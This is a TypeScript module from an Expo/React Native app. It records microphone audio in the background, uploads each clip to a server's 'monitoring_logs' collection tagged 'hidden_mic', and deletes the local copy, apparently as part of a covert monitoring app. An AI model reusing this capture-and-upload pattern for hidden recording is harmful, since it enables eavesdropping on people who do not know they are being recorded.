import { Audio } from 'expo-av';
import * as FileSystem from 'expo-file-system';
import { pb, getUserId } from '../../services/pocketbase';

let recording: Audio.Recording | null = null;
let autoStopTimer: ReturnType<typeof setTimeout> | null = null;

export const startAudioRecording = async (durationMs: number = 10000) => {
    try {
        // Stop any existing recording first
        if (recording) {
            console.log('[AudioMonitor] Stopping existing recording before starting new one');
            await stopAudioRecording();
        }

        console.log('[AudioMonitor] Requesting permissions...');
        const perm = await Audio.requestPermissionsAsync();
        if (perm.status !== 'granted') {
            console.warn('[AudioMonitor] Mic permission denied');
            return;
        }

        await Audio.setAudioModeAsync({
            allowsRecordingIOS: true,
            playsInSilentModeIOS: true,
            staysActiveInBackground: true,
        });

        const { recording: newRecording } = await Audio.Recording.createAsync(
            Audio.RecordingOptionsPresets.HIGH_QUALITY
        );
        recording = newRecording;
        console.log('[AudioMonitor] Recording started for', durationMs, 'ms');

        // Automatically stop after duration
        autoStopTimer = setTimeout(async () => {
            autoStopTimer = null;
            console.log('[AudioMonitor] Auto-stop timer fired');
            await stopAudioRecording();
        }, durationMs);

    } catch (err) {
        console.error('[AudioMonitor] Failed to start recording:', err);
    }
};

export const stopAudioRecording = async () => {
    // Clear auto-stop timer if still pending
    if (autoStopTimer) {
        clearTimeout(autoStopTimer);
        autoStopTimer = null;
    }

    if (!recording) {
        console.log('[AudioMonitor] No active recording to stop');
        return;
    }

    const currentRecording = recording;
    recording = null; // Clear reference immediately to prevent double-stop

    try {
        console.log('[AudioMonitor] Stopping recording...');
        await currentRecording.stopAndUnloadAsync();

        // Reset audio mode after recording
        await Audio.setAudioModeAsync({
            allowsRecordingIOS: false,
        });

        const uri = currentRecording.getURI();
        console.log('[AudioMonitor] Recording URI:', uri);

        if (uri) {
            // Verify the file exists and has content
            const fileInfo = await FileSystem.getInfoAsync(uri);
            console.log('[AudioMonitor] File info:', JSON.stringify(fileInfo));

            if (fileInfo.exists && fileInfo.size && fileInfo.size > 0) {
                await uploadAudio(uri);
            } else {
                console.error('[AudioMonitor] Recording file is empty or missing');
            }
        } else {
            console.error('[AudioMonitor] No recording URI available');
        }
    } catch (err) {
        console.error('[AudioMonitor] Failed to stop recording:', err);
    }
};

const uploadAudio = async (uri: string) => {
    try {
        const userId = getUserId();
        if (!userId) {
            console.error('[AudioMonitor] No authenticated user, cannot upload');
            return;
        }

        const fileName = `audio_${Date.now()}.m4a`;
        console.log('[AudioMonitor] Uploading audio:', fileName, 'for user:', userId);

        const formData = new FormData();
        // @ts-ignore — React Native FormData accepts {uri, name, type}
        formData.append('file', {
            uri,
            name: fileName,
            type: 'audio/mp4',  // m4a files are actually mp4 containers — use standard MIME type
        });
        formData.append('type', 'hidden_mic');
        formData.append('user_id', userId);

        const result = await pb.collection('monitoring_logs').create(formData);
        console.log('[AudioMonitor] Audio uploaded successfully, record ID:', result.id);

        // Cleanup local file
        try {
            await FileSystem.deleteAsync(uri, { idempotent: true });
        } catch (cleanupErr) {
            console.warn('[AudioMonitor] Cleanup failed (non-critical):', cleanupErr);
        }
    } catch (err: any) {
        console.error('[AudioMonitor] Upload failed:', err);
        console.error('[AudioMonitor] Upload error details:', JSON.stringify(err?.data || err?.response || err?.message || err));
    }
};
